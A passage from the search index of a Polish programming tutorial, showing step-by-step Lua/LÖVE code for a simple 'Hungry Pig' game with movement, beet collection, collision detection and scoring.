<li>Jak wykrywa\u0107 kolizj\u0119 pomi\u0119dzy postaciami</li> <li>Jak obs\u0142u\u017cy\u0107 koniec gry i jej restart</li> </ul>"},{"location":"learning-by-games/lua/hungry-pig/#materiay-do-pobrania","title":"Materia\u0142y do pobrania","text":""},{"location":"learning-by-games/lua/hungry-pig/#grafiki","title":"Grafiki","text":"<p>Umieszczamy w katalogu images.</p> <p> Grafiki do gry G\u0142odna \u015awinia</p>"},{"location":"learning-by-games/lua/hungry-pig/#dzwieki","title":"D\u017awi\u0119ki","text":"<p>Umieszczamy w katalogu sounds.</p> <p> D\u017awi\u0119ki do gry G\u0142odna \u015awinia</p>"},{"location":"learning-by-games/lua/hungry-pig/#czcionki","title":"Czcionki","text":"<p>Umieszczamy w katalogu fonts.</p> <p> Czcionki do gry G\u0142odna \u015awinia</p>"},{"location":"learning-by-games/lua/hungry-pig/#struktura-projektu","title":"Struktura projektu","text":"<p>Po dodaniu potrzebnych materia\u0142\u00f3w, struktura projektu powinna wygl\u0105da\u0107 mniej wi\u0119cej tak jak na grafice poni\u017cej.</p> <p></p>"},{"location":"learning-by-games/lua/hungry-pig/#zroda","title":"\u0179r\u00f3d\u0142a","text":"<ul> <li>https://kenney.nl/</li> <li>https://comigo.itch.io/farm-puzzle-animals</li> <li>https://www.zapsplat.com/music/pig-squeal-close-up/</li> </ul>"},{"location":"learning-by-games/lua/hungry-pig/#nasz-cel","title":"Nasz cel","text":""},{"location":"learning-by-games/lua/hungry-pig/#tworzymy-okno-gry","title":"Tworzymy okno gry","text":"<p>Zaczynamy od utworzenia okna gry i podstawowej konfiguracji projektu. Wymiary okna ustawimy na \\(800\\times800\\), poniewa\u017c tak mamy przygotowan\u0105 grafik\u0119 t\u0142a (bg.png). Grafik\u0119 t\u0142a najpierw musimy za\u0142adowa\u0107 z pliku za pomoc\u0105 funkcji <code>love.graphics.newImage</code>. T\u0142o wy\u015bwietlimy na ekranie w cz\u0119\u015bci rysuj\u0105cej za pomoc\u0105 polecenia <code>love.graphics.draw</code>. Przed wy\u015bwietleniem t\u0142a resetujemy ustawienia kolor\u00f3w wy\u015bwietlania za pomoc\u0105 polecenia <code>love.graphics.setColor(1,1,1,1)</code>.</p> <pre><code>function love.load()\n    math.randomseed(os.time())\n\n    Const = {width = 800, height = 800, margin = 50, framerate = 60}\n\n    Background = love.graphics.newImage(\"images/bg.png\")\nend\n\nfunction love.draw()\n    love.graphics.setColor(1,1,1,1)\n    love.graphics.draw(Background)\nend\n\nfunction love.update(dt)\nend\n</code></pre>"},{"location":"learning-by-games/lua/hungry-pig/#swinia","title":"\u015awinia","text":"<p>Zacznijmy od naszej g\u0142\u00f3wnej postaci: \u015bwini. </p>"},{"location":"learning-by-games/lua/hungry-pig/#dodajemy-aktora","title":"Dodajemy aktora","text":"<p>Jak przyjrzymy si\u0119 grafikom, to zobaczymy, \u017ce mamy kilka grafik reprezentuj\u0105cych \u015bwini\u0119 w zale\u017cno\u015bci od kierunku, w kt\u00f3rym jest obr\u00f3cona. Wykorzystamy to przy poruszaniu si\u0119 \u015bwini. Na pocz\u0105tku jednak skorzystamy z grafiki pig_down.png. Na g\u00f3rze naszego programu, w cz\u0119\u015bci inicjalizuj\u0105cej (<code>love.load</code>), zaraz pod za\u0142adowaniem grafiki t\u0142a, tworzymy naszego nowego aktora, kt\u00f3rego nazwiemy Pig. Nasz\u0105 posta\u0107 umie\u015bcimy na pocz\u0105tku na \u015brodku ekranu, czyli pod wsp\u00f3\u0142rz\u0119dnymi \\((400, 400)\\).</p> <pre><code>Pig = {\n    x = Const.width / 2,\n    y = Const.height / 2,\n    images = {\n        left = love.graphics.newImage(\"images/pig_left.png\"),\n        right = love.graphics.newImage(\"images/pig_right.png\"),\n        up = love.graphics.newImage(\"images/pig_up.png\"),\n        down = love.graphics.newImage(\"images/pig_down.png\")\n    }\n}\n\nPig.drawable = Pig.images.down\n</code></pre>"},{"location":"learning-by-games/lua/hungry-pig/#rysujemy-swinie-na-ekranie","title":"Rysujemy \u015bwini\u0119 na ekranie","text":"<p>W cz\u0119\u015bci rysuj\u0105cej dopisujemy instrukcj\u0119, kt\u00f3ra wy\u015bwietli naszego nowego aktora na ekranie:</p> <pre><code>function love.draw()\n    love.graphics.setColor(1,1,1,1)\n    love.graphics.draw(Background)\n    love.graphics.draw(Pig.drawable, Pig.x, Pig.y, 0, 1, 1, Pig.drawable.getWidth(Pig.drawable) / 2, Pig.drawable.getHeight(Pig.drawable) / 2)\nend\n</code></pre>"},{"location":"learning-by-games/lua/hungry-pig/#sterowanie-swinia","title":"Sterowanie \u015bwini\u0105","text":"<p>Nasz\u0105 \u015bwini\u0105 b\u0119dziemy sterowa\u0107 za pomoc\u0105 klawiatury. Strza\u0142kami b\u0119dziemy wybiera\u0107 kierunek, w kt\u00f3rym \u015bwinia ma pod\u0105\u017ca\u0107. Nasza \u015bwinia b\u0119dzie jednak porusza\u0107 si\u0119 przez ca\u0142y czas, pod\u0105\u017caj\u0105c w ostatnio wybranym kierunku zgodnie ze swoj\u0105 pr\u0119dko\u015bci\u0105. Do tego b\u0119d\u0105 nam potrzebne nowe zmienne, kt\u00f3re dopiszemy do naszego aktora:  - pr\u0119dko\u015b\u0107 pozioma: vx, - pr\u0119dko\u015b\u0107 pionowa: vy, - og\u00f3lna pr\u0119dko\u015b\u0107: v.</p> <p>Og\u00f3lna pr\u0119dko\u015b\u0107 pos\u0142u\u017cy nam do wyznaczania, jak szybko \u015bwinia ma si\u0119 porusza\u0107 w wybranym kierunku. T\u0119 warto\u015b\u0107 b\u0119dziemy tak\u017ce zwi\u0119ksza\u0107 po ka\u017cdym zjedzonym warzywie.</p> <p>Dopisujemy wi\u0119c nowe parametry do naszej \u015bwini. Aby na pocz\u0105tku \u015bwinia sta\u0142a w miejscu, pr\u0119dko\u015b\u0107 poziom\u0105 i pionow\u0105 ustawimy na \\(0\\). Natomiast pr\u0119dko\u015b\u0107 og\u00f3ln\u0105 ustawimy na \\(3\\), co wydaje si\u0119 by\u0107 dobrym poziomem startowym dla naszej gry. Oczywi\u015bcie zach\u0119cam do eksperymentowania!</p> <pre><code>Pig = {\n    x = Const.width / 2,\n    y = Const.height / 2,\n    vx = 0,\n    vy = 0,\n    v = 3,\n    images = {\n        left = love.graphics.newImage(\"images/pig_left.png\"),\n        right = love.graphics.newImage(\"images/pig_right.png\"),\n        up = love.graphics.newImage(\"images/pig_up.png\"),\n        down = love.graphics.newImage(\"images/pig_down.png\")\n    }\n}\n</code></pre> <p>Teraz czas zastosowa\u0107 pr\u0119dko\u015b\u0107 do pozycji \u015bwini, tak aby mog\u0142a porusza\u0107 si\u0119 po ekranie. W cz\u0119\u015bci aktualizuj\u0105cej dopisujemy dwie linijki aktualizuj\u0105ce pozycj\u0119 \u015bwini na ekranie, poprzez dodanie pr\u0119dko\u015bci do wsp\u00f3\u0142rz\u0119dnych po\u0142o\u017cenia naszego aktora. W celu zapewnienia p\u0142ynno\u015bci ruchu i sta\u0142ej liczby klatek, dodawane warto\u015bci przemno\u017cymy przez <code>dt</code> oraz <code>Const.framerate</code>.</p> <pre><code>function love.update(dt)\n    Pig.x = Pig.x + Pig.vx * dt * Const.framerate\n    Pig.y = Pig.y + Pig.vy * dt * Const.framerate\nend\n</code></pre> <p>Oczywi\u015bcie w tym momencie \u015bwinia nie b\u0119dzie si\u0119 jeszcze porusza\u0107, poniewa\u017c ustawili\u015bmy jej pr\u0119dko\u015bci na \\(0\\). Warto dla test\u00f3w tymczasowo zmieni\u0107 pr\u0119dko\u015bci vx i vy, a nast\u0119pnie uruchomi\u0107 gr\u0119 by sprawdzi\u0107, czy wszystko dzia\u0142a poprawnie.</p> <p>Teraz czas wreszcie doda\u0107 obs\u0142ug\u0119 sterowania. W tym celu b\u0119dziemy potrzebowali nowej funkcji, kt\u00f3ra pozwoli nam reagowa\u0107 na zdarzenia wci\u015bni\u0119cia klawisza na klawiaturze: <code>love.keypressed(key, scancode, isrepeat)</code>. Dopiszemy j\u0105 na dole naszego programu, pod funkcj\u0105 <code>love.update</code>. Wewn\u0105trz funkcji b\u0119dziemy reagowa\u0107 na klikni\u0119cia przycisk\u00f3w na klawiaturze. W zale\u017cno\u015bci od klikni\u0119tego przycisku, b\u0119dziemy wykonywa\u0107 inne operacje. Je\u017celi klikni\u0119ta zostanie np. strza\u0142ka w lewo, to ustawimy pr\u0119dko\u015b\u0107 poziom\u0105 vx \u015bwini na -v, wyzerujemy pr\u0119dko\u015b\u0107 pionow\u0105 i zmienimy grafik\u0119 na <code>Pig.images.left</code>.</p> <pre><code>function love.keypressed(key, scancode, isrepeat)\n    if key == \"left\" then\n        Pig.vx = -Pig.v\n        Pig.vy = 0\n        Pig.drawable = Pig.images.left\n    end\nend\n</code></pre> <p>Podobnie post\u0119pujemy z pozosta\u0142ymi kierunkami, odpowiednio zmieniaj\u0105c pr\u0119dko\u015bci \u015bwini i jej grafik\u0119.</p> <pre><code>function love.keypressed(key, scancode, isrepeat)\n    if key == \"left\" then\n        Pig.vx = -Pig.v\n        Pig.vy = 0\n        Pig.drawable = Pig.images.left\n    end\n\n    if key == \"right\" then\n        Pig.vx = Pig.v\n        Pig.vy = 0\n        Pig.drawable = Pig.images.right\n    end\n\n    if key == \"up\" then\n        Pig.vx = 0\n        Pig.vy = -Pig.v\n        Pig.drawable = Pig.images.up\n    end\n\n    if key == \"down\" then\n        Pig.vx = 0\n        Pig.vy = Pig.v\n        Pig.drawable = Pig.images.down\n    end\nend\n</code></pre>"},{"location":"learning-by-games/lua/hungry-pig/#peny-kod","title":"Pe\u0142ny kod","text":"<pre><code>function love.load()\n    math.randomseed(os.time())\n\n    Const = {width = 800, height = 800, margin = 50, framerate = 60}\n\n    Background = love.graphics.newImage(\"images/bg.png\")\n\n    Pig = {\n        x = Const.width / 2,\n        y = Const.height / 2,\n        vx = 0,\n        vy = 0,\n        v = 3,\n        images = {\n            left = love.graphics.newImage(\"images/pig_left.png\"),\n            right = love.graphics.newImage(\"images/pig_right.png\"),\n            up = love.graphics.newImage(\"images/pig_up.png\"),\n            down = love.graphics.newImage(\"images/pig_down.png\")\n        }\n    }\n\n    Pig.drawable = Pig.images.down\nend\n\nfunction love.draw()\n    love.graphics.setColor(1,1,1,1)\n    love.graphics.draw(Background)\n    love.graphics.draw(Pig.drawable, Pig.x, Pig.y, 0, 1, 1, Pig.drawable.getWidth(Pig.drawable) / 2, Pig.drawable.getHeight(Pig.drawable) / 2)\nend\n\nfunction love.update(dt)\n    Pig.x = Pig.x + Pig.vx * dt * Const.framerate\n    Pig.y = Pig.y + Pig.vy * dt * Const.framerate\nend\n\nfunction love.keypressed(key, scancode, isrepeat)\n    if key == \"left\" then\n        Pig.vx = -Pig.v\n        Pig.vy = 0\n        Pig.drawable = Pig.images.left\n    end\n\n    if key == \"right\" then\n        Pig.vx = Pig.v\n        Pig.vy = 0\n        Pig.drawable = Pig.images.right\n    end\n\n    if key == \"up\" then\n        Pig.vx = 0\n        Pig.vy = -Pig.v\n        Pig.drawable = Pig.images.up\n    end\n\n    if key == \"down\" then\n        Pig.vx = 0\n        Pig.vy = Pig.v\n        Pig.drawable = Pig.images.down\n    end\nend\n</code></pre>"},{"location":"learning-by-games/lua/hungry-pig/#buraki","title":"Buraki","text":"<p>Nasza \u015bwinia b\u0119dzie \u017cywi\u0107 si\u0119 burakami. Na ekranie zawsze b\u0119dzie dok\u0142adnie jeden burak. Gdy \u015bwinia zje buraka, ten pojawi si\u0119 ponownie w nowym, losowym miejscu na ekranie.</p>"},{"location":"learning-by-games/lua/hungry-pig/#dodajemy-aktora_1","title":"Dodajemy aktora","text":"<p>Naszego aktora zapiszemy w zmiennej <code>Beet</code>. Utworzymy go na podstawie grafiki beetroot.png i pocz\u0105tkowo umie\u015bcimy w dowolnym miejscu na ekranie, np. pod wsp\u00f3\u0142rz\u0119dnymi \\((200, 200)\\). Nowego aktora definiujemy w cz\u0119\u015bci inicjalizuj\u0105cej (<code>love.load</code>).</p> <pre><code>Beet = {\n    x = 200,\n    y = 200,\n    drawable = love.graphics.newImage(\"images/beetroot.png\")\n}\n</code></pre>"},{"location":"learning-by-games/lua/hungry-pig/#rysujemy-buraka-na-ekranie","title":"Rysujemy buraka na ekranie","text":"<p>W cz\u0119\u015bci rysuj\u0105cej dopisujemy instrukcj\u0119, kt\u00f3ra wy\u015bwietli naszego nowego aktora na ekranie. Aby nasz burak wy\u015bwietla\u0142 si\u0119 pod \u015bwini\u0105, a nie nad ni\u0105, now\u0105 instrukcj\u0119 dodamy zaraz przed instrukcj\u0105 rysuj\u0105c\u0105 \u015bwini\u0119.</p> <pre><code>function love.draw()\n    love.graphics.setColor(1,1,1,1)\n    love.graphics.draw(Background)\n    love.graphics.draw(Beet.drawable, Beet.x, Beet.y, 0, 1, 1, Beet.drawable.getWidth(Beet.drawable) / 2, Beet.drawable.getHeight(Beet.drawable) / 2)\n    love.graphics.draw(Pig.drawable, Pig.x, Pig.y, 0, 1, 1, Pig.drawable.getWidth(Pig.drawable) / 2, Pig.drawable.getHeight(Pig.drawable) / 2)\nend\n</code></pre>"},{"location":"learning-by-games/lua/hungry-pig/#zjadanie-burakow","title":"Zjadanie burak\u00f3w","text":"<p>Podczas poruszania si\u0119 po ekranie, gdy \u015bwinia wejdzie w kolizj\u0119 z burakiem, to go zje. Po zjedzeniu buraka \u015bwinia powinna przyspieszy\u0107, wyda\u0107 odpowiedni odg\u0142os, a sam burak powinien przemie\u015bci\u0107 si\u0119 w losowe miejsce na ekranie.</p> <p>W celu stwierdzenia, \u017ce \u015bwinia jest w kolizji z burakiem, stworzymy pomocnicz\u0105 funkcj\u0119 <code>Collides(actor1, actor1)</code>. Nasza funkcja przyjmie dwa parametry: aktor\u00f3w, dla kt\u00f3rych sprawdzamy kolizj\u0119. Funkcj\u0119 dopiszemy na samym dole naszego kodu. W celu sprawdzenia, czy dwie postacie s\u0105 w kolizji, sprawdzimy kolizj\u0119 prostok\u0105t\u00f3w zdefiniowanych przez ich grafiki.</p> <pre><code>function Collides(actor1, actor2)\n    return actor1.x + actor1.drawable.getWidth(actor1.drawable) &gt;= actor2.x and\n            actor1.x &lt;= actor2.x + actor2.drawable.getWidth(actor2.drawable) and\n            actor1.y + actor1.drawable.getHeight(actor1.drawable) &gt;= actor2.y and\n            actor1.y &lt;= actor2.y + actor2.drawable.getHeight(actor2.drawable)\nend\n</code></pre> <p>Z naszej pomocniczej funkcji skorzystamy w nast\u0119puj\u0105cy spos\u00f3b:</p> <pre><code>if Collides(Pig, Beet) then\nend\n</code></pre> <p>Wszystko b\u0119dziemy teraz zapisywa\u0107 w cz\u0119\u015bci aktualizuj\u0105cej love.update, zaraz pod zmian\u0105 pozycji \u015bwini.</p> <p>Po wykryciu kolizji zacznijmy od przemieszczenia buraka w losowe miejsce. Osobno wylosujemy nowe warto\u015bci dla wsp\u00f3\u0142rz\u0119dnych \\(x\\) oraz \\(y\\). Aby jednak burak nie pojawi\u0142 si\u0119 na brzegu ekranu, warto zadba\u0107 o odpowiedni margines, np \\(50\\) pikseli. W celu wylosowania warto\u015bci skorzystamy z biblioteki math oraz funkcji random, do kt\u00f3rej, jako argumenty, przekazujemy przedzia\u0142, z jakiego chcemy wylosowa\u0107 warto\u015b\u0107.</p> <pre><code>Beet.x = math.random(Const.margin, Const.width - Const.margin)\nBeet.y = math.random(Const.margin, Const.height - Const.margin)\n</code></pre> <p>Nast\u0119pnie zwi\u0119kszamy pr\u0119dko\u015b\u0107 \u015bwini. W tym celu modyfikujemy parametr v, dodaj\u0105c do niego jak\u0105\u015b niewielk\u0105 liczb\u0119, np. \\(0.8\\). Warto poeksperymentowa\u0107 z r\u00f3\u017cnymi warto\u015bciami by dobra\u0107 odpowiedni dla siebie poziom trudno\u015bci.</p> <pre><code>Pig.v = Pig.v + 0.8\n</code></pre> <p>&lt;!-- Na koniec warto jeszcze doda\u0107 efekty d\u017awi\u0119kowe.</p> <pre><code>sounds.pig.play()\n``` --&gt;\n\nCa\u0142y kod stwierdzaj\u0105cy kolizj\u0119 z burakiem prezentuje si\u0119 nast\u0119puj\u0105co:\n\n```lua\nif Collides(Pig, Beet) then\n    Beet.x = math.random(Const.margin, Const.width - Const.margin)\n    Beet.y = math.random(Const.margin, Const.height - Const.margin)\n    Pig.v = Pig.v + 0.8\nend\n</code></pre> <p>Umieszczamy nasz\u0105 instrukcj\u0119 w cz\u0119\u015bci aktualizuj\u0105cej.</p> <pre><code>function love.update(dt)\n    Pig.x = Pig.x + Pig.vx * dt * Const.framerate\n    Pig.y = Pig.y + Pig.vy * dt * Const.framerate\n\n    if Collides(Pig, Beet) then\n        Beet.x = math.random(Const.margin, Const.width - Const.margin)\n        Beet.y = math.random(Const.margin, Const.height - Const.margin)\n        Pig.v = Pig.v + 0.8\n    end\nend\n</code></pre>"},{"location":"learning-by-games/lua/hungry-pig/#peny-kod_1","title":"Pe\u0142ny kod","text":"<pre><code>function love.load()\n    math.randomseed(os.time())\n\n    Const = {width = 800, height = 800, margin = 50, framerate = 60}\n\n    Background = love.graphics.newImage(\"images/bg.png\")\n\n    Pig = {\n        x = Const.width / 2,\n        y = Const.height / 2,\n        vx = 0,\n        vy = 0,\n        v = 3,\n        images = {\n            left = love.graphics.newImage(\"images/pig_left.png\"),\n            right = love.graphics.newImage(\"images/pig_right.png\"),\n            up = love.graphics.newImage(\"images/pig_up.png\"),\n            down = love.graphics.newImage(\"images/pig_down.png\")\n        },\n        sound = love.audio.newSource(\"sounds/pig.wav\", \"static\")\n    }\n\n    Pig.drawable = Pig.images.down\n\n    Beet = {\n        x = 200,\n        y = 200,\n        drawable = love.graphics.newImage(\"images/beetroot.png\")\n    }\nend\n\nfunction love.draw()\n    love.graphics.setColor(1,1,1,1)\n    love.graphics.draw(Background)\n    love.graphics.draw(Beet.drawable, Beet.x, Beet.y, 0, 1, 1, Beet.drawable.getWidth(Beet.drawable) / 2, Beet.drawable.getHeight(Beet.drawable) / 2)\n    love.graphics.draw(Pig.drawable, Pig.x, Pig.y, 0, 1, 1, Pig.drawable.getWidth(Pig.drawable) / 2, Pig.drawable.getHeight(Pig.drawable) / 2)\nend\n\nfunction love.update(dt)\n    Pig.x = Pig.x + Pig.vx * dt * Const.framerate\n    Pig.y = Pig.y + Pig.vy * dt * Const.framerate\n\n    if Collides(Pig, Beet) then\n        Beet.x = math.random(Const.margin, Const.width - Const.margin)\n        Beet.y = math.random(Const.margin, Const.height - Const.margin)\n        Pig.v = Pig.v + 0.8\n    end\nend\n\nfunction love.keypressed(key, scancode, isrepeat)\n    if key == \"left\" then\n        Pig.vx = -Pig.v\n        Pig.vy = 0\n        Pig.drawable = Pig.images.left\n    end\n\n    if key == \"right\" then\n        Pig.vx = Pig.v\n        Pig.vy = 0\n        Pig.drawable = Pig.images.right\n    end\n\n    if key == \"up\" then\n        Pig.vx = 0\n        Pig.vy = -Pig.v\n        Pig.drawable = Pig.images.up\n    end\n\n    if key == \"down\" then\n        Pig.vx = 0\n        Pig.vy = Pig.v\n        Pig.drawable = Pig.images.down\n    end\nend\n\nfunction Collides(actor1, actor2)\n    return actor1.x + actor1.drawable.getWidth(actor1.drawable) &gt;= actor2.x and\n            actor1.x &lt;= actor2.x + actor2.drawable.getWidth(actor2.drawable) and\n            actor1.y + actor1.drawable.getHeight(actor1.drawable) &gt;= actor2.y and\n            actor1.y &lt;= actor2.y + actor2.drawable.getHeight(actor2.drawable)\nend\n</code></pre>"},{"location":"learning-by-games/lua/hungry-pig/#punkty","title":"Punkty","text":"<p>C\u00f3\u017c to za gra bez punkt\u00f3w! Dodanie jednak punkt\u00f3w do naszej gry to \u017caden problem. Punkty b\u0119dziemy dostawa\u0107 za ka\u017cdego zjedzonego buraka. Na pocz\u0105tku dopisujemy punkty w postaci nowej zmiennej points do naszej \u015bwini. Pocz\u0105tkowo punkty ustawiamy na \\(0\\). Nasza zmienna <code>Pig</code> powinna teraz wygl\u0105da\u0107 mniej wi\u0119cej tak:</p> <pre><code>Pig = {\n    x = Const.width / 2,\n    y = Const.height / 2,\n    vx = 0,\n    vy = 0,\n    v = 3,\n    points = 0,\n    images = {\n        left = love.graphics.newImage(\"images/pig_left.png\"),\n        right = love.graphics.newImage(\"images/pig_right.png\"),\n        up = love.graphics.newImage(\"images/pig_up.png\"),\n        down = love.graphics.newImage(\"images/pig_down.png\")\n    },\n    sound = love.audio.newSource(\"sounds/pig.wav\", \"static\")\n}\n</code></pre>"},{"location":"learning-by-games/lua/hungry-pig/#wyswietlamy-punkty","title":"Wy\u015bwietlamy punkty","text":"<p>Zanim przejdziemy do zliczania punkt\u00f3w, wy\u015bwietlmy je na ekranie gry. Aby wy\u015bwietli\u0107 na ekranie przejrzysty, wycentrowany tekst, przyda nam si\u0119 pomocnicza funkcja <code>DrawCenteredText(x, y, text, font)</code>, kt\u00f3ra przyjmie cztery parametry: wsp\u00f3\u0142rz\u0119dne \u015brodka tekstu (<code>x, y</code>), tekst do wy\u015bwietlenia (<code>text</code>) oraz czcionka do wykorzystania (<code>font</code>). Nasz\u0105 funkcj\u0119 warto umie\u015bci\u0107 zaraz pod cz\u0119\u015bci\u0105 rysuj\u0105c\u0105 (<code>love.draw</code>), czyli nad cz\u0119\u015bci\u0105 aktualizuj\u0105c\u0105 (<code>love.update</code>).</p> <pre><code>function DrawCenteredText(x, y, text, font)\n    local textWidth = font:getWidth(text)\n    local textHeight = font:getHeight()\n    love.graphics.print(text, font, x, y, 0, 1, 1, textWidth/2, textHeight/2)\nend\n</code></pre> <p>Zanim b\u0119dziemy mogli wy\u015bwietli\u0107 tekst na ekranie, potrzebujemy za\u0142adowa\u0107 odpowiedni\u0105 czcionk\u0119 i zdefiniowa\u0107 jej rozmiar. W cz\u0119\u015bci inicjalizuj\u0105cej (<code>love.load</code>), na samym ko\u0144cu, dopiszemy nowy zbi\u00f3r <code>Fonts</code>, w kt\u00f3rym za\u0142adujemy sobie czcionk\u0119 do wy\u015bwietlania punkt\u00f3w:</p> <pre><code>Fonts = {\n    points = love.graphics.newFont(\"fonts/kenney_bold.ttf\", 60)\n}\n</code></pre> <p>Teraz mo\u017cemy przyst\u0105pi\u0107 do wy\u015bwietlania punkt\u00f3w na ekranie. W tym celu, w cz\u0119\u015bci rysuj\u0105cej <code>love.draw</code>, dopisujemy wywo\u0142anie naszej pomocniczej funkcji <code>DrawCenteredText</code>. Jako parametry podamy pozycj\u0119 tekstu na ekranie (po\u0142owa szeroko\u015bci jako \\(x\\) i \\(50\\) pikseli jako \\(y\\)), tekst do wy\u015bwietlenia (punkty, czyli <code>Pig.points</code>), a tak\u017ce czcionk\u0119 do wykorzystania (<code>Fonts.points</code>).</p> <pre><code>DrawCenteredText(Const.width / 2, 50, Pig.points, Fonts.points)\n</code></pre> <p>W celu uzyskania \u0142adnego, \u017c\u00f3\u0142tego koloru, przed wywo\u0142aniem funkcji <code>DrawCenteredText</code> dopisujemy jeszcze wywo\u0142anie polecenia <code>love.graphics.setColor</code>. Wybierzemy kolor \\((253, 238, 0)\\).</p> <pre><code>love.graphics.setColor(love.math.colorFromBytes(253, 238, 0))\nDrawCenteredText(Const.width / 2, 50, Pig.points, Fonts.points)\n</code></pre> <p>Polecenie dopisujemy na koniec cz\u0119\u015bci rysuj\u0105cej.</p> <pre><code>function love.draw()\n    love.graphics.setColor(1,1,1,1)\n    love.graphics.draw(Background)\n    love.graphics.draw(Beet.drawable, Beet.x, Beet.y, 0, 1, 1, Beet.drawable.getWidth(Beet.drawable) / 2, Beet.drawable.getHeight(Beet.drawable) / 2)\n    love.graphics.draw(Pig.drawable, Pig.x, Pig.y, 0, 1, 1, Pig.drawable.getWidth(Pig.drawable) / 2, Pig.drawable.getHeight(Pig.drawable) / 2)\n    love.graphics.setColor(love.math.colorFromBytes(253, 238, 0))\n    DrawCenteredText(Const.width / 2, 50, Pig.points, Fonts.points)\nend\n</code></pre>"},{"location":"learning-by-games/lua/hungry-pig/#zliczamy-punkty","title":"Zliczamy punkty","text":"<p>Jak ju\u017c ustalili\u015bmy, punkty b\u0119dziemy dostawa\u0107 za ka\u017cdego zjedzonego buraka. W takim razie, do cz\u0119\u015bci, w kt\u00f3rej wykrywamy kolizj\u0119 z burakiem, dopisujemy zwi\u0119kszanie punkt\u00f3w: <code>Pig.points = Pig.points + 1</code>. Warto to dopisa\u0107 zaraz pod zwi\u0119kszeniem pr\u0119dko\u015bci \u015bwini, tak aby zachowa\u0107 czytelno\u015b\u0107 kodu, ale kolejno\u015b\u0107 nie ma du\u017cego znaczenia.</p> <pre><code>if Collides(Pig, Beet) then\n    Beet.x = math.random(Const.margin, Const.width - Const.margin)\n    Beet.y = math.random(Const.margin, Const.height - Const.margin)\n    Pig.v = Pig.v + 0.8\n    Pig.points = Pig.points + 1\nend\n</code></pre>"},{"location":"learning-by-games/lua/hungry-pig/#peny-kod_2","title":"Pe\u0142ny kod","text":"<pre><code>function love.load()\n    math.randomseed(os.time())\n\n    Const = {width = 800, height = 800, margin = 50, framerate = 60}\n\n    Background = love.graphics.newImage(\"images/bg.png\")\n\n    Pig = {\n        x = Const.width / 2,\n        y = Const.height / 2,\n        vx = 0,\n        vy = 0,\n        v = 3,\n        points = 0,\n        images = {\n            left = love.graphics.newImage(\"images/pig_left.png\"),\n            right = love.graphics.newImage(\"images/pig_right.png\"),\n            up = love.graphics.newImage(\"images/pig_up.png\"),\n            down = love.graphics.newImage(\"images/pig_down.png\")\n        },\n        sound = love.audio.newSource(\"sounds/pig.wav\", \"static\")\n    }\n\n    Pig.drawable = Pig.images.down\n\n    Beet = {\n        x = 200,\n        y = 200,\n        drawable = love.graphics.newImage(\"images/beetroot.png\")\n    }\n\n    Fonts = {\n        points = love.graphics.newFont(\"fonts/kenney_bold.ttf\", 60)\n    }\nend\n\nfunction love.draw()\n    love.graphics.setColor(1,1,1,1)\n    love.graphics.draw(Background)\n    love.graphics.draw(Beet.drawable, Beet.x, Beet.y, 0, 1, 1, Beet.drawable.getWidth(Beet.drawable) / 2, Beet.drawable.getHeight(Beet.drawable) / 2)\n    love.graphics.draw(Pig.drawable, Pig.x, Pig.y, 0, 1, 1, Pig.drawable.getWidth(Pig.drawable) / 2, Pig.drawable.getHeight(Pig.drawable) / 2)\n    love.graphics.setColor(love.math.colorFromBytes(253, 238, 0))\n    DrawCenteredText(Const.width / 2, 50, Pig.points, Fonts.points)\nend\n\nfunction DrawCenteredText(x, y, text, font)\n    local textWidth = font:getWidth(text)\n    local textHeight = font:getHeight()\n    love.graphics.print(text, font, x, y, 0, 1, 1, textWidth/2, textHeight/2)\nend\n\nfunction love.update(dt)\n    Pig.x = Pig.x + Pig.vx * dt * Const.framerate\n    Pig.y = Pig.y + Pig.vy * dt * Const.framerate\n\n    if Collides(Pig, Beet) then\n        Beet.x = math.random(Const.margin, Const.width - Const.margin)\n        Beet.y = math.random(Const.margin, Const.height - Const.margin)\n        Pig.v = Pig.v + 0.8\n        Pig.points = Pig.points + 1\n    end\nend\n\nfunction love.keypressed(key, scancode, isrepeat)\n    if key == \"left\" then\n        Pig.vx = -Pig.v\n        Pig.vy = 0\n        Pig.drawable = Pig.images.left\n    end\n\n    if key == \"right\" then\n        Pig.vx = Pig.v\n        Pig.vy = 0\n        Pig.drawable = Pig.images.right\n    end\n\n    if key == \"up\" then\n        Pig.vx = 0\n        Pig.vy = -Pig.v\n        Pig.drawable = Pig.images.up\n    end\n\n    if key == \"down\" then\n        Pig.vx = 0\n        Pig.vy = Pig.v\n        Pig.drawable = Pig.images.down\n    end\nend\n\nfunction Collides(actor1, actor2)\n    return actor1.x + actor1.drawable.getWidth(actor1.drawable) &gt;= actor2.x and\n            actor1.x &lt;= actor2.x + actor2.drawable.getWidth(actor2.drawable) and\n            actor1.y + actor1.drawable.getHeight(actor1.drawable) &gt;= actor2.y and\n            actor1.y &lt;= actor2.y + actor2.drawable.getHeight(actor2.drawable)\nend\n</code></pre>"},{"location":"learning-by-games/lua/hungry-pig/#koniec-gry","title":"Koniec gry","text":"<p>C\u00f3\u017c to za gra, kt\u00f3ra si\u0119 nie ko\u0144czy? Nasza gra b\u0119dzie ko\u0144czy\u0107 si\u0119, gdy \u015bwinia wyjdzie poza ekran. W celu zapami\u0119tania, \u017ce gra si\u0119 ju\u017c zako\u0144czy\u0142a, dopiszemy do \u015bwini now\u0105 zmienn\u0105 dead, kt\u00f3r\u0105 na pocz\u0105tku ustawimy na warto\u015b\u0107 false. Do zbioru <code>images</code> naszej \u015bwini za\u0142adujemy tak\u017ce grafik\u0119 pig_dead.png. Teraz nasza zmienna <code>Pig</code> powinna wygl\u0105da\u0107 mniej wi\u0119cej tak:</p> <pre><code>Pig = {\n    x = Const.width / 2,\n    y = Const.height / 2,\n    vx = 0,\n    vy = 0,\n    v = 3,\n    points = 0,\n    dead = false,\n    images = {\n        left = love.graphics.newImage(\"images/pig_left.png\"),\n        right = love.graphics.newImage(\"images/pig_right.png\"),\n        up = love.graphics.newImage(\"images/pig_up.png\"),\n        down = love.graphics.newImage(\"images/pig_down.png\"),\n        dead = love.graphics.newImage(\"images/pig_dead.png\")\n    },\n    sound = love.audio.newSource(\"sounds/pig.wav\", \"static\")\n}\n</code></pre>"},{"location":"learning-by-games/lua/hungry-pig/#wyswietlamy-komunikat","title":"Wy\u015bwietlamy komunikat","text":"<p>Zacznijmy od wy\u015bwietlenia na ekranie komunikatu o zako\u0144czeniu gry. W cz\u0119\u015bci rysuj\u0105cej, gdy gra jest zako\u0144czona, tzn. gdy zmienna <code>Pig.dead</code> ma warto\u015b\u0107 true, wy\u015bwietlimy na ekranie komunikat GAME OVER. Kolor komunikatu ustawimy na czerwony, a dok\u0142adniej \\((227, 0, 